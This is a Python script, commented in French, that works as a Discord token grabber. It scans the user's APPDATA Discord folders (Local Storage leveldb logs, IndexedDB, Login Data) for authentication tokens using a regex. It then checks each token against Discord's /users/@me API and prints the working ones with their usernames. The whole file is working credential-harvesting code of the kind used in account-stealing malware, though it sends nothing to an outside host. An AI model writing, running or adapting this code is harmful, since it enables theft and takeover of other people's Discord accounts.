import os
import re
from pathlib import Path
from typing import List, Dict, Optional
import requests

# Pattern regex correspondant au format standard des tokens Discord
TOKEN_REGEX = r"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9]{27}"


def get_discord_paths() -> List[Path]:
    """Retourne les chemins vers les dossiers/fichiers contenant les tokens."""
    appdata = Path(os.getenv("APPDATA")) / "discord"
    return [appdata / "Local Storage", appdata / "IndexedDB", appdata / "Login Data"]


def extract_tokens_from_file(file_path: Path) -> List[str]:
    """Extrait les tokens d'un fichier texte ou leveldb."""
    tokens = []
    try:
        with open(file_path, "r", encoding="utf-8") as f:
            content = f.read()
            # re.findall retourne une liste de chaînes correspondant au pattern
            found = re.findall(TOKEN_REGEX, content)
            tokens.extend(found)
    except Exception as e:
        print(f"[WARN] Lecture échouée pour {file_path}: {e}")
    return list(set(tokens))


def validate_token(token: str) -> Optional[Dict[str, str]]:
    """Vérifie la validité du token via l'API Discord officielle."""
    try:
        headers = {"Authorization": token}
        res = requests.get("https://discord.com/api/users/@me", headers=headers, timeout=5)
        if res.status_code == 200:
            return {
                "token": token,
                "username": res.json().get("username"),
                "status": "valide"
            }
    except Exception as e:
        print(f"[WARN] Validation échouée pour {token}: {e}")
    return None


def main() -> Dict[str, List[Dict[str, str]]]:
    """Fonction principale : scanne les chemins Discord, extrait et valide les tokens."""
    all_tokens = []
    paths = get_discord_paths()

    for p in paths:
        if not p.exists():
            continue
        
        # Local Storage est un dossier Leveldb contenant plusieurs fichiers .log
        if p.is_dir():
            for subfile in p.glob("*.log"):
                all_tokens.extend(extract_tokens_from_file(subfile))
        elif p.is_file():
            all_tokens.extend(extract_tokens_from_file(p))

    # Filtrage des tokens valides via la fonction validate_token
    valid_tokens = [t for t in (validate_token(tok) for tok in all_tokens) if t is not None]
    
    return {"tokens_valides": valid_tokens}


if __name__ == "__main__":
    result = main()
    print(f"Tokens trouvés et valides : {len(result['tokens_valides'])}")
    for t in result["tokens_valides"]:
        # Affichage tronqué du token pour lisibilité
        print(f"  - @{t['username']} | Token: {t['token'][:20]}...")